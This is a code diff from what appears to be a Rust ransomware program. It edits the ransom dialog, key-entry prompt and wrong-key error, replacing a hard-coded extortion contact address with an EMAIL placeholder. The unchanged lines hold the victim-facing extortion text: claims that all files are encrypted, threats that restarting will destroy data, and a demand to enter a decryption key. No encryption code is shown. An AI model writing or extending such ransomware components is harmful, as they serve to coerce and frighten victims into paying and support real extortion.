@@ -13,7 +13,7 @@ pub fn show_ransom_dialog(correct_key: &str) -> Result<(), String> {
          All your important files are now encrypted with military-grade encryption.\n\n\
          🔑 To recover your files, you need the decryption key.\n\n\
          📝 Check RANSOM_NOTE.txt in the encrypted directories for instructions.\n\n\
-         📧 Contact: ransomware@protonmail.com\n\n\
+         Contact: EMAIL\n\n\
          ❌ DO NOT restart your computer or delete any files.\n\
          ❌ This is your only warning!\n\n\
          Press OK to enter the decryption key."
@@ -39,7 +39,7 @@ To recover your files, enter the decryption key below.
 
 Check RANSOM_NOTE.txt for the key.
 
-📧 Contact: ransomware@protonmail.com
+Contact: EMAIL
 
 ⚠️  WARNING: Do not restart or your data will be lost permanently!',
 'DECRYPTION KEY REQUIRED',
@@ -97,7 +97,7 @@ Check RANSOM_NOTE.txt for the key.
                     let error_msg = wide_string(
                         "The key you entered is incorrect!\n\n\
                          Please check RANSOM_NOTE.txt and try again.\n\n\
-                         📧 Contact: ransomware@protonmail.com\n\n\
+                         Contact: EMAIL\n\n\
                          The correct key is in the note file."
                     );
                     
